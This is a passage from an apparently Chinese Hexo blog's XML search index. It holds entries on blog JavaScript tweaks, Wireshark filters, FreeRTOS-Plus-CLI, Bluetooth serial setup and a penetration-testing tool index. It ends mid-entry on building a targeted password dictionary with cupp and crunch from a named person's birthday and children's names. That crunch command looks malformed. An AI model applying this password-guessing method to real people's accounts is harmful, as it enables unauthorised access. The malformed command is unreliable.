class="hljs-string">&#x27;blur(10px)&#x27;</span>);<br>  navbar.css(<span class="hljs-string">&#x27;backdrop-filter&#x27;</span>, <span class="hljs-string">&#x27;blur(10px)&#x27;</span>);<br><br>  <span class="hljs-comment">// 注释掉页首取消毛玻璃效果的代码</span><br>  <span class="hljs-comment">// if (navbar.offset().top &gt; 0) &#123;</span><br>  <span class="hljs-comment">//   navbar.removeClass(&#x27;navbar-dark&#x27;);</span><br>  <span class="hljs-comment">//   submenu.removeClass(&#x27;navbar-dark&#x27;);</span><br>  <span class="hljs-comment">// &#125; else &#123;</span><br>  <span class="hljs-comment">//   navbar.addClass(&#x27;navbar-dark&#x27;);</span><br>  <span class="hljs-comment">//   submenu.removeClass(&#x27;navbar-dark&#x27;);</span><br>  <span class="hljs-comment">// &#125;</span><br>&#125;);<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-90469042" role="button" aria-expanded="false" aria-controls="collapse-90469042">        <div class="fold-arrow">▶</div>动态获取主题色      </div>      <div class="fold-collapse collapse" id="collapse-90469042">        <div class="fold-content">          <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将十六进制颜色转换为 RGB 对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> </span>hex 十六进制颜色值</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns <span class="hljs-type">&#123;object|null&#125;</span> </span>RGB 对象 &#123;r, g, b&#125; 或 null</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexToRgb</span>(<span class="hljs-params">hex</span>) </span>&#123;<br>  <span class="hljs-comment">// 移除 # 号</span><br>  hex = hex.replace(<span class="hljs-regexp">/^#/</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-comment">// 处理缩写形式（如 #fff 转换为 #ffffff）</span><br>  <span class="hljs-keyword">if</span> (hex.length === <span class="hljs-number">3</span>) &#123;<br>    hex = hex[<span class="hljs-number">0</span>] + hex[<span class="hljs-number">0</span>] + hex[<span class="hljs-number">1</span>] + hex[<span class="hljs-number">1</span>] + hex[<span class="hljs-number">2</span>] + hex[<span class="hljs-number">2</span>];<br>  &#125;<br>  <br>  <span class="hljs-comment">// 解析十六进制值</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-regexp">/^([a-f\d]&#123;2&#125;)([a-f\d]&#123;2&#125;)([a-f\d]&#123;2&#125;)$/i</span>.exec(hex);<br>  <br>  <span class="hljs-keyword">return</span> result ? &#123;<br>    <span class="hljs-attr">r</span>: <span class="hljs-built_in">parseInt</span>(result[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">g</span>: <span class="hljs-built_in">parseInt</span>(result[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">b</span>: <span class="hljs-built_in">parseInt</span>(result[<span class="hljs-number">3</span>], <span class="hljs-number">16</span>)<br>  &#125; : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WireShark</title>
    <link href="/tips/wireshark/"/>
    <url>/tips/wireshark/</url>
    
    <content type="html"><![CDATA[<h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ul><li><code>ip.addr == 192.168.1.1</code>只显示与<strong>192.168.1.1</strong>相关的流量。</li><li><code>http</code>只抓HTTP流量</li><li><code>tcp</code>只抓 TCP 流量</li><li><code>udp port 53</code>只抓 UDP DNS 解析流量</li><li><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code>只看TCP三次握手</li><li><code>tcp.analysis.retransmission</code> 查找 TCP 重传</li><li><code>tcp.analysis.lost_segment</code> 定位 TCP 丢包</li><li><code>tcp.flags.reset==1</code> 查看哪些连接被 RST 终止</li></ul><h4 id="软件操作"><a href="#软件操作" class="headerlink" title="软件操作"></a>软件操作</h4><ul><li><code>Capture&gt;Options，选择特定接口</code>只抓某个网卡的数据</li><li><code>File&gt;Export Objects &gt;HTTP</code> 可以看到所有的 HTTP 传输对象</li><li><code>View &gt; Coloring Rules</code> 给不同协议或状态添加颜色，根据不同流量类型设置高亮（如 SYN 数据包标红、RST 连接终止标蓝）<br>在Wireshark中可以快速查看哪些设备流量最高、哪个协议占用最多。</li><li><code>Statistics &gt; Conversations</code> 统计对话流量</li><li><code>Statistics &gt; Protocol Hierarchy</code> 统计协议分布</li><li><code>Statistics &gt; IO Graph</code> 查看 IO 走势</li></ul><p>掌握 SSL/TLS 预共享密钥，Wireshark能用来解密 HTTPS流量</p><ul><li><code>Edit &gt; Preferences &gt; Protocols &gt; TLS</code> 添加 SSL Key Log 文件</li><li><code>ssl&amp;&amp;tcp.port==443</code> 过滤 HTTPS 流量<br>如果有服务器的密钥文件，可以直接解密HTTPS传输内容</li></ul><h4 id="远程抓包"><a href="#远程抓包" class="headerlink" title="远程抓包"></a>远程抓包</h4><p><code>tcpdump -i eth0 -w capture.pcap</code>在 Linux 服务器上抓包并保存为文件，把capture.pcap拷回本地，用Wireshark打开分析。或者<br><code>ssh root@192.168.1.1 &quot;tcpdump -i eth0 -w -&quot; | wireshark -k -i - -T pcap</code>通过 ssh+Wireshark 远程抓包</p><h4 id="Tshark"><a href="#Tshark" class="headerlink" title="Tshark"></a>Tshark</h4><p>Wireshark的GUI界面很好用，但如果需要自动化分析，Tshark(Wireshark的CLl版本)是个利器。</p><ul><li><code>tshark -i eth0 -f &quot;tcp port 80&quot;</code>直接过滤抓取 TCP 80 端口流量</li><li><code>tshark -r capture.pcap -Y &quot;http.request&quot;| wc -l</code>统计 HTTP 访问次数</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文章前后JS插入元素</title>
    <link href="/blog/blog_Injection/"/>
    <url>/blog/blog_Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="文章时效性提醒"><a href="#文章时效性提醒" class="headerlink" title="文章时效性提醒"></a>文章时效性提醒</h1><p>创建<code>Blog\source\js\outdated.js</code>，实际渲染效果取决于博客主题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> times = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">&#x27;time&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (times.length === <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">return</span>; &#125;<br>  <span class="hljs-keyword">var</span> posts = <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&#x27;post-content&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (posts.length === <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">return</span>; &#125;<br><br>  <span class="hljs-keyword">var</span> pubTime = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(times[<span class="hljs-number">0</span>].dateTime);  <span class="hljs-comment">/* 文章发布时间戳 */</span><br>  <span class="hljs-keyword">var</span> now = <span class="hljs-built_in">Date</span>.now()  <span class="hljs-comment">/* 当前时间戳 */</span><br>  <span class="hljs-keyword">var</span> interval = <span class="hljs-built_in">parseInt</span>(now - pubTime)<br>  <span class="hljs-comment">/* 发布时间超过指定时间（毫秒）默认30天 */</span><br>  <span class="hljs-keyword">if</span> (interval &gt; <span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>*<span class="hljs-number">1000</span>)&#123;<br>    <span class="hljs-keyword">var</span> days = <span class="hljs-built_in">parseInt</span>(interval / <span class="hljs-number">86400000</span>)<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    posts[0].insertAdjacentHTML(&#x27;afterbegin&#x27;, &#x27;&lt;div class=&quot;note note-warning&quot; style=&quot;font-size:0.9rem&quot;&gt;&lt;p&gt;&#x27; +</span><br><span class="hljs-comment">      &#x27;&lt;div class=&quot;h6&quot;&gt;文章时效性提示&lt;/div&gt;&lt;p&gt;这是一篇发布于 &#x27; + days + &#x27; 天前的文章，部分信息可能已发生改变，请注意甄别。&#x27; +</span><br><span class="hljs-comment">      &#x27;&lt;/p&gt;&lt;/p&gt;&lt;/div&gt;&#x27;);</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// or</span><br>    posts[<span class="hljs-number">0</span>].insertAdjacentHTML(<span class="hljs-string">&#x27;afterbegin&#x27;</span>, <span class="hljs-string">&#x27;&lt;span class=&quot;label label-primary&quot;&gt;这是一篇发布于 &#x27;</span> + days + <span class="hljs-string">&#x27; 天前的文章&lt;/span&gt;&#x27;</span>);<br>  &#125;<br>&#125;)();<br></code></pre></td></tr></table></figure><h1 id="网站运行时间"><a href="#网站运行时间" class="headerlink" title="网站运行时间"></a>网站运行时间</h1><p>创建<code>Blog\source\js\duration.js</code>，实际渲染效果取决于博客主题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js">!(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-comment">/** 计时起始时间，自行修改(UTC) **/</span><br>  <span class="hljs-keyword">var</span> start = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(<span class="hljs-string">&quot;2022/01/11 15:29:33&quot;</span>);<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> now = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<br>    now.setTime(now.getTime()+<span class="hljs-number">250</span>);<br>    days = (now - start) / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span> / <span class="hljs-number">60</span> / <span class="hljs-number">24</span>;<br>    dnum = <span class="hljs-built_in">Math</span>.floor(days);<br>    hours = (now - start) / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span> / <span class="hljs-number">60</span> - (<span class="hljs-number">24</span> * dnum);<br>    hnum = <span class="hljs-built_in">Math</span>.floor(hours);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(hnum).length === <span class="hljs-number">1</span> )&#123;<br>      hnum = <span class="hljs-string">&quot;0&quot;</span> + hnum;<br>    &#125;<br>    minutes = (now - start) / <span class="hljs-number">1000</span> /<span class="hljs-number">60</span> - (<span class="hljs-number">24</span> * <span class="hljs-number">60</span> * dnum) - (<span class="hljs-number">60</span> * hnum);<br>    mnum = <span class="hljs-built_in">Math</span>.floor(minutes);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(mnum).length === <span class="hljs-number">1</span> )&#123;<br>      mnum = <span class="hljs-string">&quot;0&quot;</span> + mnum;<br>    &#125;<br>    seconds = (now - start) / <span class="hljs-number">1000</span> - (<span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * dnum) - (<span class="hljs-number">60</span> * <span class="hljs-number">60</span> * hnum) - (<span class="hljs-number">60</span> * mnum);<br>    snum = <span class="hljs-built_in">Math</span>.round(seconds);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">String</span>(snum).length === <span class="hljs-number">1</span> )&#123;<br>      snum = <span class="hljs-string">&quot;0&quot;</span> + snum;<br>    &#125;<br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;timeDate&quot;</span>).innerHTML = <span class="hljs-string">&quot;本站已运行&amp;nbsp&quot;</span>+dnum+<span class="hljs-string">&quot;&amp;nbsp天&quot;</span>;<br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;times&quot;</span>).innerHTML = hnum + <span class="hljs-string">&quot;&amp;nbsp小时&amp;nbsp&quot;</span> + mnum + <span class="hljs-string">&quot;&amp;nbsp分&amp;nbsp&quot;</span> + snum + <span class="hljs-string">&quot;&amp;nbsp秒🌼&quot;</span>;<br>  &#125;<br><br>  update();<br>  <span class="hljs-built_in">setInterval</span>(update, <span class="hljs-number">1000</span>);<br>&#125;)();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回车（Carriage Return）换行（Line Feed）</title>
    <link href="/tips/CRLF/"/>
    <url>/tips/CRLF/</url>
    
    <content type="html"><![CDATA[<h1 id="回车（Carriage-Return）换行（Line-Feed）"><a href="#回车（Carriage-Return）换行（Line-Feed）" class="headerlink" title="回车（Carriage Return）换行（Line Feed）"></a>回车（Carriage Return）换行（Line Feed）</h1><p>回车CR-将光标移动到当前行的开头。<br>换行LF-将光标“垂直”移动到下一行。</p><p>CR用符号’\r’表示, 十进制ASCII代码是13, 十六进制代码为0x0D<br>LF使用’\n’符号表示, ASCII代码是10, 十六制为0x0A</p><ul><li>Dos和windows采用回车+换行CR/LF表示下一行，每行结尾是“&lt;换行&gt;&lt;回车&gt;”，即“\n\r”；</li><li>而UNIX/Linux采用换行符LF表示下一行，每行结尾只有“&lt;换行&gt;”，即”\n”；</li><li>苹果机(MAC OS系统)采用回车符CR表示下一行，每行结尾是“&lt;回车&gt;”，即”\r”；</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>计算机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-Plus-CLI 命令行接口</title>
    <link href="/FreeRTOS-plus-CLI/01-FreeRTOS-plus-CLI/"/>
    <url>/FreeRTOS-plus-CLI/01-FreeRTOS-plus-CLI/</url>
    
    <content type="html"><![CDATA[<h1 id="FreeRTOS-Plus-CLI"><a href="#FreeRTOS-Plus-CLI" class="headerlink" title="FreeRTOS-Plus-CLI"></a>FreeRTOS-Plus-CLI</h1><p><strong>可扩展命令行接口框架</strong></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>FreeRTOS-Plus-CLI （命令行接口）提供了一种简单、小巧、可扩展且 RAM 高效的方法， 方便您的 FreeRTOS 应用程序处理命令行输入。添加命令所需的步骤如下图表（可点击）所示， <strong>可通过单击流程中的每个阶段</strong>， 了解具体实例。</p><ol><li><a href="/FreeRTOS-plus-CLI/02-Implementing-a-command/" title="02-Implementing-a-command">02-Implementing-a-command</a></li><li><a href="/FreeRTOS-plus-CLI/03-Command-parameters/" title="03-Command-parameters">03-Command-parameters</a></li><li><a href="/FreeRTOS-plus-CLI/04-Registering-a-command/" title="04-Registering-a-command">04-Registering-a-command</a></li><li><a href="/FreeRTOS-plus-CLI/05-Calling-the-interpreter/" title="05-Calling-the-interpreter">05-Calling-the-interpreter</a></li><li><a href="/FreeRTOS-plus-CLI/06-A-FreeRTOS-plus-CLI-task/" title="06-A-FreeRTOS-plus-CLI-task">06-A-FreeRTOS-plus-CLI-task</a></li><li><a href="/FreeRTOS-plus-CLI/07-Buffer-management/" title="07-Buffer-management">07-Buffer-management</a></li></ol><p>FreeRTOS-Plus-CLI 可在 官方 <a href="https://www.freertos.org/Documentation/02-Kernel/01-About-the-FreeRTOS-kernel/03-Download-freeRTOS/01-DownloadFreeRTOS">FreeRTOS 压缩文件下载包的以下目录中找到</a>：<code>FreeRTOS-Plus/Source/FreeRTOS-Plus-CLI</code>。 本网站还提供了多个<a href="https://www.freertos.org/zh-cn-cmn-s/Documentation/03-Libraries/02-FreeRTOS-plus/03-FreeRTOS-plus-CLI/FreeRTOS_Plus_CLI_Demos">示例项目</a>。</p><p>FreeRTOS V10.0.0 FreeRTOS-Plus-CLI 与 FreeRTOS 内核采用<a href="https://www.freertos.org/Documentation/02-Kernel/01-About-the-FreeRTOS-kernel/04-Licensing/01-Licensing">相同的 MIT 许可。</a></p>]]></content>
    
    
    <categories>
      
      <category>FreeRTOS</category>
      
      <category>CLI</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>From.蓝牙串口 To.个域网</title>
    <link href="/BluetoothSerial/"/>
    <url>/BluetoothSerial/</url>
    
    <content type="html"><![CDATA[<h1 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h1><p>开发中的HID设备（<a href="/hid/HID_firstDig/" title="hid&#x2F;HID_firstDig">hid&#x2F;HID_firstDig</a>、<a href="/hid/HID_secondDig/" title="hid&#x2F;HID_secondDig">hid&#x2F;HID_secondDig</a>）虽然开发遇到瓶颈很久没动，但逐渐发现一个有用的场景，就是配合其他设备，快速输入特定信息，如：输密码、自动点击安全键盘。需要实现个域网连接，热点过于臃肿、耗电；蓝牙不影响上网、使用广泛，最适合此场景。</p><h2 id="先前研究"><a href="#先前研究" class="headerlink" title="先前研究"></a>先前研究</h2><p>此前基于 <a href="https://www.thinkpad.com/device/339">X1Carbon</a> with Kali 对蓝牙 hid SDP 的尝试是失败的：电脑的功能过于复杂，修改注册信息的尝试也不成功，沉寂一个月后，在2025年9月28日-29日对 ESP32 的两天研究中，使用原生开发实现了蓝牙 HID 输入功能。后续阶段，将 STRINGLN 等命令抽离为算法开始研究。<br>然而很长一段时间都被<a href="/FreeRTOS_digging#CLI">命令行输入 &gt; CLI</a>牵制，现在开始将算法搁置，研究<a href="/FreeRTOS_digging/" title="FreeRTOS">FreeRTOS</a>的功能和个域网连接。培养对项目的信心<br><img src="https://pic1.imgdb.cn/item/695dcf0e2475f92cc325c174.png" alt="硬件黑客盒子示例"></p><h2 id="蓝牙串口101"><a href="#蓝牙串口101" class="headerlink" title="蓝牙串口101"></a>蓝牙串口101</h2><h3 id="电脑端Windows"><a href="#电脑端Windows" class="headerlink" title="电脑端Windows"></a>电脑端Windows</h3><p><a href="https://bluetoothinstaller.com/bluetooth-command-line-tools">Bluetooth Command Line Tools</a>是面向 Windows 的蓝牙命令行工具套件，由 Bluetooth Driver Installer 团队开发，提供 7 个独立命令行程序，可在 CMD/PowerShell 或批处理脚本中完成本地蓝牙适配配置、设备发现、配对、OBEX 文件传输、COM 端口管理等操作，无需图形界面，适合自动化与脚本集成。</p><table><thead><tr><th align="left">工具</th><th align="left">核心功能</th></tr></thead><tbody><tr><td align="left">btcom</td><td align="left">启用/禁用远程蓝牙服务，映射/删除蓝牙COM端口</td></tr><tr><td align="left">btconfig</td><td align="left">配置本地蓝牙适配器：修改名称、设备类别、开关可发现性、禁用/启用入站连接</td></tr><tr><td align="left">btdiscovery</td><td align="left">扫描周边蓝牙设备与服务，输出设备名称、MAC地址、设备类别、RSSI等信息</td></tr><tr><td align="left">btftp</td><td align="left">通过OBEX FTP协议，浏览、上传、下载远程蓝牙设备的文件系统</td></tr><tr><td align="left">btinfo</td><td align="left">读取本地蓝牙适配器详细信息：MAC地址、设备名称、LMP版本、设备类别等</td></tr><tr><td align="left">btobex</td><td align="left">通过OBEX Object Push协议，向远程蓝牙设备发送文件</td></tr><tr><td align="left">btpair</td><td align="left">与远程蓝牙设备配对（支持PIN码、SSP协议），管理已配对设备记录</td></tr></tbody></table><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><ol><li>执行<code>btshell.bat</code>可以将工具添加到PATH</li><li>手动在设置里配对手机和电脑</li><li>执行<code>btdiscovery</code>找到手机MAC地址</li><li>执行<code>btcom.exe -r -b&quot;[MAC地址]&quot;</code>绑定串口</li><li>手机下载<code>Serial Bluetooth Terminal</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">btcom &#123;-c|-r&#125; &#123;-bBluetoothAddress | -nFriendlyName&#125; [-s&#123;sp|dun|GUID|UUID&#125;]<br><br> -c  Create association between COM port and a remote service<br>     (Enable non-COM service).<br> -r  Remove association between COM port and a remote service<br>     (Disable non-COM service).<br> -s  Remote service to use (Default is Serial Port Service)<br> -b  Bluetooth address of remote device <span class="hljs-keyword">in</span> (XX:XX:XX:XX:XX:XX) format.<br> -n  Friendly name of remote device.<br> -h  Prints this <span class="hljs-built_in">help</span> screen.<br></code></pre></td></tr></table></figure></li></ol><h3 id="手机Android"><a href="#手机Android" class="headerlink" title="手机Android"></a>手机Android</h3><ol><li><code>Serial Bluetooth Terminal</code>在GooglePlay可以下载，作者有个<a href="https://github.com/kai-morich/SimpleBluetoothTerminal">Github仓库</a>，仅根据README判断，可能仓库不是全部源码。不过，先把菜做出来，磨刀的事回头再做。</li><li>点击左上角的 <strong>hamburger icon</strong> 打开侧边导航栏</li><li>Devices 选中电脑</li><li>回到 Terminal 点击垃圾桶左边的连接图标连接</li><li>成功后就建立了连接，电脑端打开 Windterm 或其他支持串口的终端工具即可</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>蓝牙串口连接在手机与电脑发送文字时，手机连接的蓝牙耳机依然正常工作。<br>借助蓝牙实现的数据互联首先能够通过串口模块直接与嵌入式设备通信，无需实现网络连接，节省设备空间，同时模块化的<strong>硬件黑客盒子</strong>高内聚低耦合，在关键时刻能够拆成专用工具完成特定目的，在硬件升级方面也能避免牵一发而动全身。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>无线电</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从HID硬件开发到筑牢FreeRTOS基础</title>
    <link href="/FreeRTOS_digging/"/>
    <url>/FreeRTOS_digging/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习FreeRTOS是基于需求：<a href="/hid/HID_firstDig/" title="hid&#x2F;HID_firstDig">hid&#x2F;HID_firstDig</a>，<a href="/hid/HID_secondDig/" title="hid&#x2F;HID_secondDig">hid&#x2F;HID_secondDig</a><br>品尝完一开始从无到有的甜头后，我认为是时间先深度学习FreeRTOS的功能，以防反复重构。</p><h2 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h2><p>没想到没想到，打开<a href="https://www.freertos.org/zh-cn-cmn-s/Documentation/01-FreeRTOS-quick-start/01-Beginners-guide/04-FreeRTOS-libraries-and-3rd-party-tools">官方文档</a>没翻几页就发现了费劲写的交互其实有轮子，不过这个<a href="https://www.freertos.org/Documentation/03-Libraries/02-FreeRTOS-plus/03-FreeRTOS-plus-CLI/01-FreeRTOS-plus-CLI">库的介绍</a>中文页面链接不好，翻译也有点抽象，所以我翻译一下，刚好可以真正用到隐藏文章的功能。</p><ol><li><a href="/FreeRTOS-plus-CLI/01-FreeRTOS-plus-CLI/" title="FreeRTOS-Plus-CLI 命令行接口">FreeRTOS-Plus-CLI 命令行接口</a></li><li><a href="/FreeRTOS-plus-CLI/02-Implementing-a-command/" title="实现命令">实现命令</a></li><li><a href="/FreeRTOS-plus-CLI/03-Command-parameters/" title="命令参数">命令参数</a></li><li><a href="/FreeRTOS-plus-CLI/04-Registering-a-command/" title="注册命令">注册命令</a></li><li><a href="/FreeRTOS-plus-CLI/05-Calling-the-interpreter/" title="调用解释器">调用解释器</a></li><li><a href="/FreeRTOS-plus-CLI/06-A-FreeRTOS-plus-CLI-task/" title="FreeRTOS-Plus-IO 集成">FreeRTOS-Plus-IO 集成</a></li><li><a href="/FreeRTOS-plus-CLI/07-Buffer-management/" title="缓冲区管理">缓冲区管理</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客渗透工具目录</title>
    <link href="/pen/myPenetrationToolsTOC/"/>
    <url>/pen/myPenetrationToolsTOC/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>工具</th><th>链接</th><th></th><th></th></tr></thead><tbody><tr><td>NMAP</td><td><a href="/pen/W1R3S#NMAP">W1R3S &gt; NMAP</a></td><td><a href="/pen/SickOS1.1_2way#端口扫描">SickOS1.1_2way &gt; 端口扫描</a></td><td><a href="/pen/JARBAS#基础思路">JARBAS &gt; 基础思路</a></td></tr><tr><td>FTP</td><td><a href="/pen/W1R3S#ftp">W1R3S &gt; ftp</a></td><td></td><td></td></tr><tr><td>hash</td><td><a href="/pen/W1R3S#可疑hash辨认">W1R3S &gt; 可疑hash辨认</a></td><td><a href="/pen/W1R3S#md5解码">W1R3S &gt; md5解码</a></td><td></td></tr><tr><td>SQL</td><td>靶场<code>SQLi-labs</code></td><td></td><td></td></tr><tr><td>bash字符串处理工具</td><td></td><td></td><td></td></tr><tr><td>base64</td><td></td><td></td><td></td></tr><tr><td>目录爆破</td><td></td><td></td><td></td></tr><tr><td>漏洞查询</td><td></td><td></td><td></td></tr><tr><td>POST</td><td></td><td></td><td></td></tr><tr><td>john</td><td></td><td></td><td></td></tr><tr><td>hydra</td><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从信息收集到构建密码字典</title>
    <link href="/pen/cipherDict/"/>
    <url>/pen/cipherDict/</url>
    
    <content type="html"><![CDATA[<h1 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a><a href="https://www.cnblogs.com/z9m8r8/articles/15568887.html">cupp</a></h1><h2 id="Kali下载安装-cupp"><a href="#Kali下载安装-cupp" class="headerlink" title="Kali下载安装 cupp"></a>Kali下载安装 cupp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/Mebus/cupp.git<br></code></pre></td></tr></table></figure><h1 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a><a href="https://zhuanlan.zhihu.com/p/1920040942922077399">Crunch</a></h1><p>根据以下信息的生日、孩子名字、名字生成密码字典，涵盖年龄、名字缩写、组合、常见单词、leet</p><h4 id="1-基础组合字典（无-Leet）"><a href="#1-基础组合字典（无-Leet）" class="headerlink" title="1. 基础组合字典（无 Leet）"></a>1. 基础组合字典（无 Leet）</h4><p>name: Michael age: 27 birth date: 19/10/1996 number of children: 3 “ Ahmed - Yasser - Adam “ Hobbies: swimming</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成包含姓名、生日、年龄、孩子名的基础组合，长度 4-16</span><br>crunch 4 16 -t Michael%%,%19101996%,%%27,%Ahmed%,%Yasser%,%Adam%,%swim% -o michael_base.txt<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><code>4 16</code>：密码长度范围 4-16 位</li><li><code>-t</code>：指定模板，<code>%</code> 代表数字占位符（可替换为生日 / 年龄）</li><li><code>-o</code>：输出到指定文件</li></ul></li></ul><h4 id="2-Leet-替换字典（核心规则）"><a href="#2-Leet-替换字典（核心规则）" class="headerlink" title="2. Leet 替换字典（核心规则）"></a>2. Leet 替换字典（核心规则）</h4><p>Leet 替换需要自定义字符集，创建 <code>leet_charset.txt</code> 文件，写入常用 Leet 映射：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 